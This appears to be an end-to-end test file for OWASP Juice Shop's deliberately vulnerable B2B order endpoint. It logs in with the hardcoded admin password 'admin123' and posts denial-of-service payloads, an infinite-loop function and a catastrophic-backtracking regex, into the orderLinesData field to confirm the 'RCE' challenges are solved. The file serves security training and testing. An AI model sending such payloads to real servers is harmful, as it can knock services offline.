const config = require('config')

describe('/b2b/v2/order', () => {
  protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

  describe('challenge "rce"', () => {
    it('an infinite loop deserialization payload should not bring down the server', () => {
      browser.ignoreSynchronization = true
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: \'(function dos() { while(true); })()\'});')
      browser.driver.sleep(1000)
      browser.ignoreSynchronization = false
    })

    protractor.expect.challengeSolved({challenge: 'RCE Tier 1'})
  })

  describe('challenge "rceOccupy"', () => {
    xit('should be possible to cause request timeout using a recursive regular expression payload', () => {
      browser.ignoreSynchronization = true
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: \'/((a+)+)b/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")\'});')
      browser.driver.sleep(4000) // 2sec for the deserialization timeout plus 2sec for Angular
      browser.ignoreSynchronization = false
    })

    // protractor.expect.challengeSolved({challenge: 'RCE Tier 2'})
  })
})
